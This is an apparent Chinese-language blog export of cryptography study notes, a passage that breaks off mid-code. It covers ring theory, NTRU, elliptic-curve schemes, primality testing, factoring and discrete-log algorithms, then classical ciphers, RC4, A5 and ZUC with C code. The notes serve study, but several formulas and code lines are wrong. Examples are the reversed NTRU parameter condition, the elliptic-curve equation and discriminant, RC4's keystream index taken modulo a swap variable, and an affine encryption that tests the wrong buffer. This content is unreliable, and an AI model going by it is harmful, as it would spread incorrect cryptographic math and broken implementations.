$\\cdot$ 对 $+$ 有双边分配律; 为区别, $+$ 的单位元称为零元(记 $0$), 逆元称为负元(记 $-a$). 单位: $a\\in R$, $\\exists b\\in R$ s.t. $ab=ba=e$, 则称 $a$ 为单位; 环中所有单位构成单位群, 记 $U(R)$; $U(\\mathbb{Z}_m)=\\mathbb{Z}_m^*$. 零因子: 非零元 $a,b\\in R$ s.t. $ab=0$, $a$ 为 $b$ 的左零因子.\n交换环: $(R,\\cdot)$ 为交换半群. 交换幺环: $(R,\\cdot)$ 为交换幺半群. 无零因子环: $(R,\\cdot)$ 为无零因子半群. 整环: $(R,\\cdot)$ 为无零因子交换幺半群. 域: $(R-\\{0\\},\\cdot)$ 为Abel群.\n双边理想: 非空集合 $I\\subset R$, $I$ 对 $+$ 封闭, 对 $\\cdot$ 吸收, 即 $\\forall s\\in R$, $sI\\subset I$, $Is\\subset I$, 记 $I \\lhd R$; $d\\mathbb{Z}\\lhd\\mathbb{Z}$.\n商环: $I\\lhd R$, $R/I \u0026lt; R$; $R/I=\\{a+I\\ | \\ a\\in R\\}$. $(a+I)+(b+I)=(a+b)+I$, $(a+I)(b+I)=(ab)+I$.\n映射: 不妨设 $a_1+I=a_2+I$, $b_1+I=b_2+I$, 则有 $(a_1b_1)+I=(a_2b_2)+I$. 考虑 $a_1-a_2\\in I$, $b_1-b_2\\in I$, 有 $a_1=s+a_2$, $b_1=t+b_2$, $s, t\\in I$, 进而 $a_1b_1=a_2b_2+x=a_2b_2+(sb_2+ta_2+st)$, 同时 $x\\in I$.\n封闭: $\\forall x\\in I$, $(a+x)(b+x)=ab+(a+b+x)x\\in (ab)+I$.\n由此可知, 理想的吸收性可确保商环存在.\n生成理想: 非空集合 $S\\subset R$, 包含 $S$ 的所有理想的交集; 特别 $S=\\{a\\}$ 时, 记 $\\langle S\\rangle=\\langle a\\rangle$ 为 $a$ 生成的主理想; 特别 $R$ 为交换幺环时, 主理想 $\\langle a\\rangle=\\{ra\\ | \\ r\\in R\\}$; $\\mathbb{Z}$ 的所有理想均为主理想.\n任取非平凡理想 $I\\lhd \\mathbb{Z}$, $\\exists$ 最小 $t\\in\\mathbb{Z}_+$, $\\forall m\\in I$, $m=qt+r$, $q,r\\in I$, $0\\leq r\u0026lt;t$, 即 $r=0$, $I=\\langle t\\rangle$.\n素理想: 交换幺环 $R$, 非平凡 $P\\lhd R$, 若 $ab\\in P$, 有 $a\\in P$ 或 $b\\in P$; 特别整环中, 素元 $p$, $\\langle p\\rangle$ 为素理想. 交换幺环 $R$, $P\\lhd R$, $R/P$ 为整环 $\\iff P$ 为素理想. 极大理想: 交换幺环 $R$, 非平凡 $M\\lhd R$, 无真包含 $M$ 的非平凡理想. 交换幺环 $R$, $M\\lhd R$, $R/M$ 为域 $\\iff M$ 为极大理想. 极大理想一定为素理想, 反之不然.\nEuclid整环(ED): 满足Euclid性的整环, $\\forall a,b\\in R-\\{0\\}$, 有映射 $\\varepsilon: R-\\{0\\}\\to \\mathbb{Z}_+$ s.t. $\\varepsilon(a)\\leq\\varepsilon(ab)$, $\\exists r,q\\in R$ s.t. $a=bq+r$, $\\varepsilon(r)\u0026lt;\\varepsilon(b)$ 或 $r=0$; 其上有最大公因数. 主理想整环(PID): 理想均为主理想的整环; 其上素元和不可约元等价, 素理想和极大理想等价; 素元为非零元非单位 $p$ s.t. $a,b\\in R$, 若 $p|ab$, 有 $p|a$ 或 $p|b$; 不可约元为非零元非单位 $q$ s.t. $a,b\\in R$, 若 $q=ab$, 有 $a$ 或 $b$ 为单位. 唯一析因整环(UFD): 整环 $R$ 中非零元非单位的元素可以唯一表示为有限个不可约元的积.\n定理: 所有域都是ED; 所有ED都是PID; 所有PID都是UFD.\n特征: ${\\rm char}(R)=\\inf\\{n\\in\\mathbb{Z}_+\\ | \\ na=a,\\forall a\\in R\\}$ 或0; ${\\rm char}(\\mathbb{Z})=0$, ${\\rm char}(\\mathbb{Z}_m)=m$; 整环特征必为0或素数, 非空有限域特征必为素数, ${\\rm char}(F_p)=p$; $\\forall a,b\\in F_p$, $(a+b)^p=a^p+b^p$.\n$|e| = \\infty$ 时, ${\\rm char}(R)=0$.\n$|e| = n$ 时, 若 $n$ 为合数, $\\exists p|n$，不妨设 $pc=n$, $ne=(pe)(ce)=0$, 则 $pe=0$ 或 $ce=0$, 矛盾. $\\forall a\\in R$, $na=(ne)a=0$.\n单变量多项式环: 整环 $R$ 上整环 $R[x]=\\{a_nx^n+\u0026hellip;+a_1x+a_0\\ | \\ a_i\\in R\\}$; 记 $f(x)=a_nx^n+\u0026hellip;+a_1x+a_0$, $a_n\\ne 0$ 时, 记 ${\\rm deg}f=n$; 特别 ${\\rm deg}0=-\\infty$. $f(x),g(x),h(x)\\in R[x]$, $f(x)g(x)=h(x)$, 则 ${\\rm deg}f+{\\rm deg}g={\\rm deg}h$. 域 $K$, $f(x)\\in K[x]$, ${\\rm deg}f\u0026gt;0$, $p(x)$ 为 $f(x)$ 次数最小的因式, 则 $p(x)$ 为 $K[x]$ 上不可约多项式, 且 ${\\rm deg}p\\leq \\frac{1}{2}{\\rm deg}f$.\n带余除法: $f(x),g(x)\\in R[x]$, 则 $\\exists q(x),r(x)\\in R[x]$ s.t. $f(x)=q(x)g(x)+r(x)$, ${\\rm deg}r\u0026lt;{\\rm deg}g$. $f(x)\\in R[x]$, $a\\in R$, 则 $\\exists q(x)$ s.t. $f(x)=(x-a)q(x)+f(a)$. $f(x)\\in R[x]$, $a\\in R$, 则 $x-a|f(x)\\iff f(a)=0$. 同余: 首一多项式 $m(x)\\in R[x]$, $f(x),g(x)\\in R[x]$, $m(x)|f(x)-g(x)$, 记 $f(x)\\equiv g(x)({\\rm mod}\\ m(x))$.\nEuclid: 域 $K$ 上 $K[x]$ 为ED; 即有Euclid性和最大公因式. $f(x),g(x)\\in K[x]$, $g(x)|f(x)\\iff r(x)=0$. $f(x)\\in K[x]$, $\\forall K[x]$ 上不可约多项式 $p(x)$, ${\\rm deg}p\\leq {\\rm deg}f$, s.t. $p(x)\\nmid f(x)$, 则 $f(x)$ 为 $K[x]$ 上不可约多项式.\n定理: 域 $F$ 上 $F[x]$, $f(x)\\in F(x)$, 则 $F[x]/f(x)$ 为域 $\\iff f(x)$ 为 $F[x]$ 上不可约多项式. 特别有素数 $p$ 和 $F[x]$ 上不可约多项式 $degr=n$, $F_p[x]/\u0026lt;r(x)\u0026gt;=\\{\\sum_{i=0}^{n-1}a_0x^i\\ |\\ a_i\\in F_p\\}\\cong F_{p^n}$, 即有 $|F_p[x]/\u0026lt;r(x)\u0026gt;|=p^n$.\n有限域结构: $\\forall$ 素数 $p$, $n\\in\\mathbb{Z}_+$, 存在同构意义下唯一的有限域 $F_{p^n}$ s.t. $|F_{p^n}|=p^n$, ${\\rm char}(F_{p^m})=p$.\nNTRU: 环 $L=\\mathbb{Z}[x]/(x^n-1)$, $n$ 为大素数; 选取大数 $p,q$, 有 ${\\rm gcd}(p,q)=1$ 且 $q\\ll p$; 选取 $f(x),g(x)\\in L$, 有 ${\\rm deg}f={\\rm deg}g=n-1$. $f^{-1}_p(x)$ 为 $f(x)$ 系数模 $p$ 逆, $f^{-1}_q(x)$ 为 $f(x)$ 系数模 $q$ 逆; $h(x)\\equiv f^{-1}_q(x)({\\rm mod}\\ q)$.\n公钥 $(n,p,q,h(x))$, 明文多项式 $m(x)=\\sum a_ix_i$ 有 $|a_i|\\leq \\frac{p-1}{2}$ 及 ${\\rm deg}m\\leq n$, 随机选取噪音 $r(x)\\in L$, 加密 $c(x)\\equiv pr(x)h(x)+m(x)({\\rm mod}\\ q)$. 私钥 $(f(x),f^{-1}_p(x))$, 解密 $d(x)\\equiv f(x)c(c)({\\rm mod}q)$, $b(x)\\equiv d(x)({\\rm mod}\\ p)$, $m(x)\\equiv f^{-1}_p(x)({\\rm mod}\\ p)$. 椭圆曲线群 定义: 域 $F$, $a,b,c,d,e\\in F$, 满足Weierstrass方程 $E=y^2+axy+by=x^3+cx^2+dx+e$ 所有点 $(x,y)$ 和无穷远点 $O$ 的集合.\nHasse定理: 有限域 $GF(p)$ 上椭圆曲线, $n$ 为 $E$ 上点 $(x,y)$, $x,y\\in\\mathbb{Z}_p$ 的个数, 则 $|n-(p+1)|\\leq 2\\sqrt p$.\n有限域上椭圆曲线: 有限域 $GF(p)$ 上椭圆曲线 $y^2\\equiv x^2+ax+b({\\rm mod}\\ p)$, $a,b,x,y\\in GF(P)$, 且满足 $4a^2+27b^2\\not\\equiv 0({\\rm mod}\\ p)$ (此时无重根), 记为 $E_p(a,b)$.\n构造: $x$ 遍历 $\\in\\mathbb{Z}_p$, $t_x\\equiv x^3+ax+b({\\rm mod}\\ p)$, $a,b\\in GF(p)$; Euler保留所有模 $p$ 二次剩余的 $t_x$, 并求出两根; $t=0$ 时只有一根 $y=0$.\n定理: $E_p(a,b)$ 关于点的加法构成Abel群. 无穷远点 $O$ 为单位元, 逆元为关于 $x$ 轴对称点, 横坐标不同的点(相同的只有自身和逆元)相加为连线延长线与曲线交点关于 $x$ 轴的对称点, 相同点相加为该点处切线与曲线交点关于 $x$ 轴的对称点.\n不妨设 $P,Q\\in E_p(a,b)$, $P,Q\\ne O$, $P=(x_1,y_1)$, $Q=(x_2,y_2)$, $R=P+Q=(x_3,y_3)\\ne O$.\n则 $x_3=\\lambda^2-x_1-x_2$, $y_3=\\lambda(x_1-x_3)-y_1$, 其中 $\\lambda=\\frac{y_2-y_1}{x_2-x_1}\\ (P\\ne Q);\\ \\frac{3x^2_2+a}{2y_1}\\ (P=Q)$.\nECDH: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq a,b\\leq q-1$.\n公钥 $(p,G)$, 私钥 $x,y$. 握手: $k_{A\\to B}=aG$, $k_{B\\to A}=bG$. 密钥: $k=ak_{B\\to A}=bk_{A\\to B}=(ab)G$. ECEG: 椭圆曲线群 $E_p$, $G\\in E_p$, $|G|=q$ 为大素数, 任选 $2\\leq d\\leq q-1$, $P=dG$.\n公钥 $(P,G,E,n)$, 加密 $C_1=rG$, $C_2=M+rP$, $C=E_{E_p,P,G,r}(M)=\\{C_1,C_2\\}$, 任选 $2\\leq r\\leq q-1$. 私钥 $d$, 解密 $M=D_{E_p,d}(C)=C_2-dC_1$. 快速倍乘 $P=mG$, $m\\in\\mathbb{Z}_p$, $G\\in\\ E_p(a,b)$. 传统算法 素数定理: $\\pi(x)$ 为 $\\leq x$ 的素数个数, 有 $\\lim_{x\\to\\infty}\\frac{\\pi(x)}{x/\\ln x}=1$.\nFermat测试: 若 $n$ 为素数, $a\\in\\mathbb{Z}$, $1\\leq a\\leq n-1$, 则 $a^{n-1}\\equiv 1({\\rm mod}\\ n)$. 随机测试 $t$ 次, 确为素数可能性大于 $1-\\frac{1}{2^t}$. 1 2 3 4 5 6 7 bool fermat(int n){ int a,r; srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,p-1,p); return r == 1; } Solovay-Stranssen测试: Jacobi符号 $(\\frac{a}{m})=\\prod(\\frac{a}{p_i})^{\\alpha_i}$, 其中 $n=\\prod(p_i^{\\alpha_i})$. 若 $n$ 为素数, $x=(\\frac{a}{n})$, $y\\equiv a^{\\frac{n-1}{2}}({\\rm mod}\\ n)$, 则 $x\\equiv y({\\rm mod}\\ n)$. 1 2 3 4 5 6 7 8 9 bool solovayStrassenX(int p){ int a, x, y; srand((unsigned int)time(0)); a = rand()%p+1; x = jacobi(a,p); // jacobi同fastLegendre x = (x+p)%p; y = fastPowerMod(a,(p-1)/2,p); return x != 0 \u0026amp;\u0026amp; x == y; } Millar-Rabin测试: Fermat测试时, 不妨设 $a^{n-1}=(a^t)^{2^k}$, $a^t\\equiv 1({\\rm mod}\\ n)$ 则直接满足素性条件, 否则检验 $a^t$ 的 $i=1,\u0026hellip;,k-1$ 次平方, $(a^{t})^{2^i}\\equiv -1({\\rm mod}\\ n)$ 时直接满足素性条件. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bool millerRabin(int p){ int k = 0, t = p-1, a, r; while(t%2 == 0){ t \u0026gt;\u0026gt;= 1; ++k; } srand((unsigned int)time(0)); a = rand()%p+1; r = fastPowerMod(a,t,p); if (r == 1){ return true; } else{ for (int j = 0; j \u0026lt; k; ++j) { if (r == p-1){ return true; } else { r = (1LL*r*r)%p; } } } return false; } 大合数分解: 试除法时间复杂度 $O(\\sqrt n)$.\nPollard-$\\rho$ 法: 有限集上随机函数存在碰撞; $n$ 不为素数或某个素数的幂, 寻找小因子. 1 2 3 4 5 6 7 8 9 10 11 12 13 int rho(int n){ int a = 2, b = 2, d; do { a = ((1LL*a*a)+1)%n; b = ((1LL*b*b)+1)%n; b = ((1LL*b*b)+1)%n; d = gcd(a-b,n); if ((1 \u0026lt; d) \u0026amp;\u0026amp; (d \u0026lt; n)){ return d; } } while (d != n); return -1; } Pollard-$p-1$ 法: 素数 $p|n$, $p-1$ 分解中素因子最大次幂 $q|p-1$, $\\forall B\\geq q$ s.t. $p-1|B$, 即 $2^{B!}\\equiv 2^{p-1}\\equiv 1({\\rm mod}\\ p)$, 故有 $p|{\\rm gcd}(n,2^{B!}-1)$. 1 2 3 4 5 6 7 8 9 10 11 12 int pollard(int n){ int B = 24; int a = 2; for (int i = 2; i \u0026lt;= B; ++i) { a = fastPowerMod(a,i,n); } int d = gcd(a-1,n); if ((d \u0026gt; 1) \u0026amp;\u0026amp; (d \u0026lt; n)){ return d; } return -1; } 随机平方法: $x,y\\in\\mathbb{Z}$ s.t. $x^2\\equiv y^2({\\rm mod}\\ n)$, $x\\not\\equiv\\pm y({\\rm mod}\\ n)$, 若 $n|x^2-y^2$ 且 $n\\nmid x-y$ ($n\\nmid x+y$), 则素数 $p={\\rm gcd}(x+y,n)$ ($p={\\rm gcd}(x-y,n)$). 离散对数求解: 有限域 $F_p$ 上遍历需要 $O(p)$ 次乘法.\n小步大步法(Shank): 群阶为 $n$, $m=\\lceil\\sqrt n\\rceil$, 设 $\\log_a b=x=mj+i$, $0\\leq i,j\\leq m-1$, 即 $b(a^{-i})=(a^m)^j$; 搜索树存储 $1,a^m,\u0026hellip;,(a^m)^{m-1}$, 遍历 $b(a^{-i})$ 并匹配.\nPollard-$\\rho$ 法: 素数 $p$, $a,b\\in\\mathbb{Z}_p^*$, 不妨设 $x_i=a^{m_i}b^{n_i}$, 有碰撞 $x_i=x_{2i}$ 时, 有 $\\log_a b\\equiv (n_{2i}-n_i)^{-1}(m_{2i}-m_i)({\\rm mod}\\ |a|)$.\n$$f(x_{i+1},m_{i+1},n{i_1})=\\begin{cases} (bx,m_i,n_i+1),\\ \u0026amp; x_i\\in S_1 \\\\ (x^2,2m_i,2n_i),\\ \u0026amp; x_i\\in S_2 \\\\ (ax,m_i+1,n_i),\\ \u0026amp; x_i\\in S_3 \\end{cases},\\ S_1\\sqcup S_2\\sqcup S_3=\\mathbb{Z}_p^*$$\n指数演算法: 素数 $p$, 原根 $a\\in\\mathbb{Z}_p^*$, 小素因子基 $B=\\{p_1,p_2,\u0026hellip;,p_k\\}$, 选取 $k$ 个 $1\\leq x\\leq p-2$ 均 s.t. $x\\equiv \\alpha_1\\log_a p_1+\\alpha_2\\log_a p_2+\u0026hellip;+\\alpha_k\\log_a p_k({\\rm mod}\\ p-1)$, 可解得 $\\log_a p_1,\\log_a p_2,\u0026hellip;,\\log_a p_k$; 选取 $1\\leq s\\leq p-2$ s.t. $\\log_a b+s\\equiv \\gamma_1\\log_a p_1+\\gamma_2\\log_a p_2+\u0026hellip;+\\gamma_k\\log_a p_k({\\rm mod}\\ p-1)$\nPohlig-Hellman算法: 素数 $p$, 原根 $a\\in\\mathbb{Z}_p^*$, 最小原根 $g$, $a\\equiv g^m({\\rm mod}\\ p)$, $b\\equiv g^n({\\rm mod}\\ p)$, 则 $m\\log_a b\\equiv n({\\rm mod}\\ p-1)$ 可由扩展Euclid算法给出.\n$p-1=\\prod_{i=1}^k p_i^{\\alpha_i}$ 中均为小素数, 有 $k$ 个同余式 $m\\equiv \\sum_{j=0}^{\\alpha_i-1} c_{ij}p_i^j({\\rm mod}\\ p_i^{k_i})$; 由 Fermat 可得 $g^{c_{ij}\\frac{p-1}{p_i^{\\alpha_i}}}\\equiv a^{\\frac{p-1}{p_i}^{\\alpha_i}}({\\rm mod}\\ p)$. 遍历并得到 $0\\leq c_{ij}\\leq p_i^{\\alpha_i}-1$; 对 $k$ 个同余式使用CRT即得到 $m$.\n量子算法 ","date":"2023-09-05T00:00:00Z","permalink":"https://example.com/p/%E5%AF%86%E7%A0%81%E5%AD%A6%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/","title":"密码学数学基础"},{"content":"(C11 - GCC8.1.0)\n基础 基本属性: 信息机密性, 信息真实性, 数据完整性, 行为不可否认性.\n体制: $(M,C,K_1,K_2,E,D)$ 明文空间, 密文空间, 加密密钥空间, 解密密钥空间, 加密空间, 解密空间; 加密变换 $c=E_{k_1}(m)$, 解密变换 $m=D_{k_2}(c)$.\n类别: 对称加密, 非对称加密, Hash函数, 密码协议.\n分析: 唯密文攻击, 已知明文攻击, 选择明文攻击, 选择密文攻击, 自适应选择明文攻击, 选择密钥攻击.\n评价: 无条件安全 $P(M|C)=P(M)$; 可证明安全(破解本质为数学难题); 计算安全(破解代价超过信息价值;破解时间超过信息时效).\n攻击: 被动攻击(监听-信息机密性); 主动攻击(伪造-信息真实性,篡改-数据完整性,否认-行为不可否认性).\n古典密码 古典密码主要为置换密码和代换密码.\n置换密码: $\\sigma$ 为 $M$ 上一个置换(到自身的双射).\n加密: $(c_i)=E_{k}((m_i))=\\sigma_{k_i}((m_i))$. 解密: $(m_i)=D_{k}((c-i))=\\sigma_{k_i}^{-1}((c_i))$. 代换密码\n加密: $c_i=E_{k}(m_i)\\equiv f(m_i,k)({\\rm mod}\\ 26)$. 解密: $m_i=E_{k}(c_i)\\equiv f^{-1}(c_i,k^{-1})({\\rm mod}\\ 26)$. 单表代换可以直接通过字母频率分析破解.\n1 2 3 4 5 6 7 8 9 10 11 void freqAnalyze(char *cipher, long *count){ int num = 0; while (cipher[num] != \u0026#39;\\0\u0026#39;){ if (isupper(cipher[num])){ count[cipher[num]-\u0026#39;A\u0026#39;]++; } else if (islower(cipher[num])){ count[cipher[num]-\u0026#39;a\u0026#39;]++; } ++num; } } 粗糙度: ${\\rm M.R}=\\sum_{i=0}^25(p_i-\\frac{1}{26})^2=\\sum_{i=0}^25p_i^2-0.0385$. 明文或单表代换时 ${\\rm M.R}\\approx 0.027$, 更接近 $0$ 则更可能为多表代换.\n重合指数: ${\\rm IC}=\\sum_{i=0}^25p_i^2$. 多表代换时 ${\\rm IC}\\approx 0.0655$. 相同字母间隔为 $d_1,\u0026hellip;,d_n$, 则密钥可能长度为 ${\\rm gcd}(d_1,\u0026hellip;,d_n)$.\n仿射密码 单表代换的代表.\n1 2 3 4 5 6 7 8 9 10 11 12 void affineEn(char *plain, char *cipher, int keyA, int keyB){ long length = strlen(plain); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(cipher[i])){ cipher[i] = (keyA*(plain[i]-\u0026#39;A\u0026#39;)+keyB)%26+\u0026#39;A\u0026#39;; } else if (islower(cipher[i])){ cipher[i] = (keyA*(plain[i]-\u0026#39;a\u0026#39;)+keyB)%26+\u0026#39;a\u0026#39;; } else { cipher[i] = plain[i]; } } } 1 2 3 4 5 6 7 8 9 10 11 12 void affineDe(char *cipher, char *plain, int keyAReverse, int keyB){ long length = strlen(cipher); for (long i = 0; i \u0026lt; length; ++i) { if (isupper(cipher[i])){ plain[i] = ((keyAReverse*(cipher[i]-\u0026#39;A\u0026#39;-keyB))%26+26)%26+\u0026#39;A\u0026#39;; } else if (islower(cipher[i])){ plain[i] = ((keyAReverse*(cipher[i]-\u0026#39;a\u0026#39;-keyB))%26+26)%26+\u0026#39;a\u0026#39;; } else { plain[i] = cipher[i]; } } } Vernam密码 序列密码的基础.\n自同步序列密码 异或$\\rm XOR$ ($GF(2)$加法) $\\oplus$ 加密: 无条件安全; 可逆.\n与同步序列密码相比, 传输产生的错误有界.\n种子密钥通过LFSR(线性反馈移位寄存器)生成伪随机密钥序列 $k=k_0k_1k_2\u0026hellip;$.\n加密 $c_i=E_{k}(m)=m_i\\oplus k_i$. 解密 $m_i=D_{k}(m)=c_i\\oplus k_i$. LFSR: 状态 $(s_0,s_1,\u0026hellip;,s_{n-1})$, 递推关系式 $s_{n+k}=\\bigoplus g_is_i$, 反馈函数 $f(s_0,s_1,\u0026hellip;,s_{n-1})=\\sum g_is_i$, 连接多项式(特征多项式) $g(x)=\\sum g_ix_i$, $s_i,g_i,x_i\\in GF(2)$.\ne.g. $\\ g(x)=1+x+x^2+x^5$, $s_{5+i}=s_{i}+s_{1+i}+s_{4+i}$. $S_0=(1,0,1,1,1)$, $k=101110111011101110111\u0026hellip;$, $T=8$.\n使用verligo实现LFSR.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // 32-bit long module lfsr(32)(clk, reset, lfsr); input clk, reset; output reg [31:0] lfsr; wire d0; xnor(d0, lfsr[31], lfsr[21], lfsr[1], lfsr[0]); always @(posedge clk, posedge reset) begin if(reset) begin lfsr \u0026lt;= 32\u0026#39;h00000001; end else begin lfsr \u0026lt;= {lfsr[30:0], d0}; end end endmodule 定理: $n$ 次特征多项式为 $GF(2^n)$ 上本原多项式时, 输出 $\\max T=2^n-1$ 序列($m$ 序列).\n将 $x^{2^n-1}-1$ 在 $GF(2^n)$ 上因式分解; 保留次数为 $n$ 且不能在 $GF(2^n)$ 上整除 $x^a-1,n\u0026lt;a\u0026lt;2^n-1$ 的因式. 截获长度 $l\\geq 2(2^n-1)$ 的明密文对 $(c,m)$, 则 $k=c\\oplus m$, 有 $S_i,\u0026hellip;,S_{i+n+1}$ 个状态; 记 $X=(S_i,\u0026hellip;,S_n)$, $Y=(S_{i+1},\u0026hellip;,S_{i+n+1})$, 有 $Y\\equiv HX({\\rm mod}\\ 2)$. $m$ 序列时, $X$满秩, $H\\equiv YX^{-1}({\\rm mod}\\ 2)$ 为特征多项式的友矩阵.\n$$H=\\left( \\begin{array}{} 0 \u0026amp; 1 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ 0 \u0026amp; 0 \u0026amp; 1 \u0026amp; \u0026hellip; \u0026amp; 0 \\\\ \u0026hellip; \\\\ 0 \u0026amp; 0 \u0026amp; 0 \u0026amp; \u0026hellip; \u0026amp; 1 \\\\ g_0 \u0026amp; g_1 \u0026amp; g_2 \u0026amp; \u0026hellip; \u0026amp; g_{n-1} \\end{array}\\right )$$\n可引入非线性运算增加复杂性: 与AND($GF(2)$上乘法) $\\otimes$.\nAD5 欧洲移动通信GSM标准, 手机到基站间的链路语音加密. 由19位, 22位, 23位3个LSR组成; 时钟控制信号来自LSR1第8位, LSR2第10位, LSR3第10位; 若三者相同则均移位, 若两者相同则相同的移位, 不同的不移位; 即每个时钟至少有两个LSR移位.\n不同文献的连接多项式不同, 其中一个为:\n$$\\begin{cases} g_1(x)=x^{19}+x^{18}+x^{17}+x^{14}+1 \\\\ g_2(x)=x^{22}+x^{21}+1 \\\\ g_3(x)=x^{23}+x^{22}+x^{21}+x^8+1 \\end{cases}$$\n安全问题: 三个LSR长度过短; 种子密钥不同也会产生相同的密钥序列; 以目前计算能力不安全.\nRC4 基于非线性数据表变换. 密钥流产生分为2个阶段: 输入密钥并初始化排列S表; S表不断置换产生密钥流.\n初始化: 线性填充256字节S表, 密钥循环填充T表. $i$ 遍历 $0-255$, $j=(j+S[i]+T[i])\\%256$, 交换 $S[i]$ 和 $S[j]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 void init(uint8 *S){ char key[256] = \u0026#34;\u0026#34;, T[256] = \u0026#34;\u0026#34;; printf(\u0026#34;Key:\u0026#34;); fgets(key,256,stdin); int keyLen = strlen(key); uint8 tmp = 0, j = 0, k = 0; for (int i = 0; i \u0026lt; 256; ++i) { S[i] = i; T[i] = key[i%keyLen]; } for (int i = 0; i \u0026lt; 256; ++i) { j = (j+S[i]+T[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; } } 产生密钥流: $i$ 循环遍历 $0-255$, $j=(j+S[i])\\%256$, 交换 $S[i]$ 和 $S[j]$, $t=(S[i]+S[j])\\%256$, $k_i=S[t]$. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 void rc4EnDe(uint8 *S, char *text, char *result){ int i = 0, j = 0, t = 0; uint8 tmp; unsigned long len = strlen(text); for (unsigned long k = 0; k \u0026lt; len; ++k) { i = (i+1)%256; j = (j+S[i])%256; tmp = S[i]; S[i] = S[j]; S[j] = tmp; t = (S[i]+S[j])%tmp; result[k] = text[k]^S[t]; } } 安全问题: 存在弱密钥使得初始化置换后 $S$ 表顺序不变; 存在弱密钥使得密钥流在100万字节内完全重复; 密钥较短的容易被攻击, 但长度超过128位的密钥依然有效.\nZUC LTE-4G国际标准, 包含机密性128-EEA3和完整性128-EIA3, 基于LFSR的非线性组合逻辑结构. 分为三层结构: LSFR, Bit重组, 非线性F函数. 符号约定: $\\boxplus$ 为$GF(2^{32})$ 上加法; $|$ 为连接字符串; $_H$ 为高位16位; $_L$ 为低位16位; $\u0026lt; \u0026lt;_o$ 为循环左移.\n1 2 3 4 5 6 7 8 9 10 11 12 13 uint32 modAdd(uint32 a, uint32 b){ uint32 c = a+b; c = (c\u0026amp;0x7fffffff)+(c\u0026gt;\u0026gt;31); return c; } uint32 mod2ExpMulti(uint32 x, int exp){ return ((x\u0026lt;\u0026lt;exp)|(x\u0026gt;\u0026gt;(31-exp)))\u0026amp;0xfffffff; } uint32 rot(uint32 x, int mov){ return (x\u0026lt;\u0026lt;mov)|(x\u0026gt;\u0026gt;(31-mov)); } 输入参数: COUNT 计数器 32bit; BEARER 传载层标识 5bit; DIRECTION 传输方向标志 1bit; CK 密钥 128bit; IBS 输入比特流(明文或密文).\n密钥装入: 128bit扩展为16个31bit, $k=k_0|k_1|\u0026hellip;|k_{15}$, $v=v_0|v_1|\u0026hellip;|v_{15}$; 其中 $iv_0={\\rm COUNT}[0]$, $iv_1={\\rm COUNT}[1]$, $iv_2={\\rm COUNT}[2]$, $iv_3={\\rm COUNT}[3]$, $iv_4={\\rm BEARER}|{\\rm DIRECTION}|00$, $iv_5=iv_6=iv_7=00000000$, $iv_{j+8}=iv_j$, $j=8,9,\u0026hellip;,15$.\n1 2 3 4 5 6 for (int i = 0; i \u0026lt; 16; ++i) { key[i] = (((k[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i]-\u0026#39;0\u0026#39;) : (k[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((k[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (k[2*i+1]-\u0026#39;0\u0026#39;) : (k[2*i+1]-\u0026#39;a\u0026#39;+10)); iv[i] = (((v[2*i] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i]-\u0026#39;0\u0026#39;) : (v[2*i]-\u0026#39;a\u0026#39;+10))\u0026lt;\u0026lt;4) +((v[2*i+1] \u0026lt;= \u0026#39;9\u0026#39;) ? (v[2*i+1]-\u0026#39;0\u0026#39;) : (v[2*i+1]-\u0026#39;a\u0026#39;+10)); } LSFR: 连接多项式为 $GF(2^{31}-1)$ 上本原多项式 $g(x)=x^{16}-2^{15}x^{15}-2^{17}x^{13}-2^{21}x^{10}-2^{20}x^{4}-2^8-1$; 输出 $m$ 序列周期 $T=(2^{31}-1)^{16}-1$; 生成16个31bit LFSR块. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 void LFSRInitMode(uint32 u){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); v = modAdd(v,u); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } void LFSRWorkMode(){ uint32 v = 0, tmp = 0; v = LFSR[0]; tmp = mod2ExpMulti(LFSR[0],8); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[4],20); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[10],21); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[13],17); v = modAdd(v,tmp); tmp = mod2ExpMulti(LFSR[15],15); v = modAdd(v,tmp); if (v == 0){ v = 0x7fffffff; } for (int i = 0; i \u0026lt; 16; ++i) { LFSR[i] = LFSR[i+1]; } LFSR[15] = v; } Bit重组: $X_0=S[15]_H|S[14]_L$, $X_1=S[11]_L|S[9]_H$ ,$X_2=S[7]_L|S[5]_H$, $X_3=S[2]_L|S[0]_H$. 1 2 3 4 5 6 void bitRecons(){ X[0] = ((LFSR[15]\u0026amp;0x7fff8000)\u0026lt;\u0026lt;1)|(LFSR[14]\u0026amp;0x0000ffff); X[1] = (LFSR[11]\u0026lt;\u0026lt;16)|(LFSR[9]\u0026gt;\u0026gt;15); X[2] = (LFSR[7]\u0026lt;\u0026lt;16)|(LFSR[5]\u0026gt;\u0026gt;15); X[3] = 